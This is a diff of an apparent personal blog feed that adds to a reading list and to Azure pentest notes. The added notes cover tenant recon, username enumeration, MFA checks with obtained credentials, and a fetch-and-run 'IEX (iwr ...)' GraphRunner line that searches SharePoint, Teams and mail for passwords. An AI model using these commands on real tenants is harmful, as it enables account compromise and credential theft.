@@ -13,6 +13,9 @@
 &lt;li>Ten Lessons for a Post-Pandemic World by Fareed Zakaria&lt;/li>
 &lt;li>Jedi Search by Kevin Anderson (Jedi Academy Trilogy volume 1)&lt;/li>
 &lt;li>Dark Apprentice by Kevin Anderson (Jedi Academy Trilogy volume 2)&lt;/li>
+&lt;li>Slow Productivity: The Lost Art of Accomplishment Without Burnout by Cal Newport&lt;/li>
+&lt;li>Champings of the Force by Kevin Anderson (Jedi Academy Trilogy volume 3)&lt;/li>
+&lt;li>Company of One by Paul Jarvis&lt;/li>
 &lt;/ul></description></item><item><title>2024 Reading List</title><link>https://cipolone95.github.io/posts/reading/2024/</link><pubDate>Sun, 07 Jan 2024 07:31:25 +0600</pubDate><guid>https://cipolone95.github.io/posts/reading/2024/</guid><description>&lt;p>A curated list of great books I have read this year.&lt;/p>
 &lt;ul>
 &lt;li>Deep Work by Cal Newport&lt;/li>
@@ -441,16 +444,38 @@ aws s3api list-object-versions --bucket &amp;lt;BUCKETNAME&amp;gt; --query &amp;
 &lt;pre tabindex="0">&lt;code>Get-AADIntLoginInformation -Domain &amp;lt;example.com&amp;gt;
 Get-AADIntTenantID -Domain &amp;lt;example.com&amp;gt;
 Invoke-AADIntReconAsOutsider -DomainName &amp;lt;example.com&amp;gt;
+https://aadinternals.com/osint/
 &lt;/code>&lt;/pre>&lt;p>Azure Subdomain Enumeration&lt;/p>
-&lt;pre tabindex="0">&lt;code>#github https://github.com/yuyudhn/AzSubEnum
+&lt;pre tabindex="0">&lt;code>Github https://github.com/yuyudhn/AzSubEnum
 python3 azsubenum.py -b domain -p permutations.txt -v
 &lt;/code>&lt;/pre>&lt;p>Username Enumeration&lt;/p>
 &lt;pre tabindex="0">&lt;code>Github: https://github.com/0xZDH/Omnispray
 python3 omnispray.py -m o365_enum_office -d example.com -uf ~/Documents/userList.txt
+&lt;/code>&lt;/pre>&lt;p>Checking Azure MFA (Assuming Credentials are obtained)&lt;/p>
+&lt;pre tabindex="0">&lt;code>Github: https://github.com/dafthack/MFASweep
+Invoke-MFASweep -Username &amp;lt;Username&amp;gt; -Password &amp;lt;password&amp;gt; -Recon -IncludeADFS
 &lt;/code>&lt;/pre>&lt;/div>
 &lt;/div>
 &lt;/div>
-&lt;/div></description></item><item><title>File Manipulation</title><link>https://cipolone95.github.io/notes/ad-enumeration/windows/files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cipolone95.github.io/notes/ad-enumeration/windows/files/</guid><description>&lt;!-- Condition -->
+&lt;/div>
+&lt;div class="note-card ">
+&lt;div class="item">
+&lt;h5 class="note-title">&lt;span>Post Exploitation&lt;/span>&lt;/h5>
+&lt;div class="card">
+&lt;div class="card-body">&lt;p>GraphRunner to enumerate Office Products&lt;/p>
+&lt;pre tabindex="0">&lt;code>IEX (iwr &amp;#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&amp;#39;)
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &amp;#39;password filetype:xlsx&amp;#39;
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm &amp;#34;password&amp;#34; -MessageCount 50
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;div class="note-card ">
+&lt;div class="item">
+&lt;h5 class="note-title">&lt;span>Az and Graph Powershell Modules&lt;/span>&lt;/h5>
+&lt;div class="card">
+&lt;div class="card-body">&lt;p>Setup Az and Graph Powershell Modules&lt;/p></description></item><item><title>File Manipulation</title><link>https://cipolone95.github.io/notes/ad-enumeration/windows/files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cipolone95.github.io/notes/ad-enumeration/windows/files/</guid><description>&lt;!-- Condition -->
 &lt;div class="note-card ">
 &lt;div class="item">
 &lt;h5 class="note-title">&lt;span>Windows AD Enumeration&lt;/span>&lt;/h5>
